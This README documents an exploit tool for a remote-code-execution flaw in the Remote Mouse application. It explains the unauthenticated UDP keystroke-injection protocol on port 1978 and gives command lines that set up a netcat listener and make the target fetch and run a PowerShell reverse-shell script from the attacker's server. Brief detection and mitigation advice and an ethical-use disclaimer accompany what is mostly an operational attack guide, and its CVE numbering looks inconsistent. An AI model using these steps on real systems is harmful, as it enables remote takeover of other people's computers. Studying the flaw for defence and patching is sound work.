# CVE-2021-35448 - Remote Mouse Exploit

## Description

This exploit targets the **CVE-2021-35448** vulnerability in the Remote Mouse application (formerly WiFi Mouse). This vulnerability allows a remote unauthenticated attacker to execute arbitrary code on the target system via malicious UDP packets.

## Vulnerability

**CVE-2021-35448** is part of a series of vulnerabilities discovered in Remote Mouse by Axel Persinger (MouseTrap), including:

- **CVE-2021-27569**: Process window manipulation
- **CVE-2021-27570**: Forced process termination
- **CVE-2021-27571**: Application information retrieval
- **CVE-2021-27572**: Authentication bypass via packet replay
- **CVE-2021-27573**: Remote code execution without authentication
- **CVE-2021-27574**: Insecure update mechanism via HTTP

### Technical Details

- **Target Port**: 1978/UDP
- **Protocol**: Unencrypted UDP
- **Authentication**: None or easily bypassed
- **Impact**: Remote Code Execution (RCE)

## How the Exploit Works

The exploit works by sending specially crafted UDP packets to the Remote Mouse service listening on port 1978. The protocol uses plaintext commands with the format:

```
key <length><format><data>
```

### Supported Formats:

- `[ras]`: Single character injection (with XOR 53)
- `[noe]`: UTF-8 text injection
- `[kld]`: Special key combinations
- `[+]`: Keyboard shortcuts

## Usage

### Basic Syntax

```bash
python3 CVE-2021-35448.py -t <TARGET_IP> [OPTIONS]
```

### Options

- `-t, --target`: Target IP address (required)
- `-p, --payload`: Custom command to execute
- `-r, --reverse`: Reverse shell in IP:PORT format
- `-l, --http`: Local HTTP server in IP:PORT format (required with -r)

### Usage Examples

#### 1. Custom Command

```bash
python3 CVE-2021-35448.py -t 192.168.1.100 -p "calc.exe"
```

#### 2. Reverse Shell (Recommended)

```bash
# Terminal 1 - Listener
nc -nlvp 4444

# Terminal 2 - Exploit
python3 CVE-2021-35448.py -t 192.168.1.100 -r 192.168.1.50:4444 -l 192.168.1.50:8080
```

## Prerequisites

### Required Files

- `CVE-2021-35448.py`: Main exploitation script
- `powercat.ps1`: PowerShell script for reverse shells

### Python Dependencies

```bash
pip3 install argparse
```

### Target System

- Remote Mouse installed and running
- Port 1978/UDP accessible
- Windows system (tested on Windows 10/11)

## Features

### 1. Keystroke Injection

The exploit can simulate keystrokes to:
- Open applications (Win+R)
- Type commands
- Execute scripts

### 2. Automatic Reverse Shell

- Automatically starts a local HTTP server
- Downloads and executes powercat.ps1
- Establishes a reverse shell connection

### 3. Special Character Handling

- Automatic character encoding
- Support for key combinations
- Delay between keystrokes to avoid errors

## Detection and Mitigation

### Detection

- Monitor UDP traffic on port 1978
- Detect suspicious PowerShell commands
- Monitor unusual outbound connections

### Mitigation

1. **Uninstall Remote Mouse** if not necessary
2. **Configure firewall** to block port 1978
3. **Use a password** (bypassable but adds a layer)
4. **Network segmentation** to isolate workstations

## Warning

⚠️ **ETHICAL USE ONLY** ⚠️

This tool is intended for educational purposes and authorized penetration testing only. Unauthorized use of this exploit is illegal and may result in legal prosecution.

## References

- [MouseTrap Research by Axel Persinger](https://axelp.io/MouseTrap)
- [CVE-2021-27572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27572)
- [CVE-2021-27573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27573)
- [Remote Mouse Official Website](https://remotemouse.net/)

## Author

Developed for educational and ethical penetration testing purposes.

---

*Last updated: 2025*
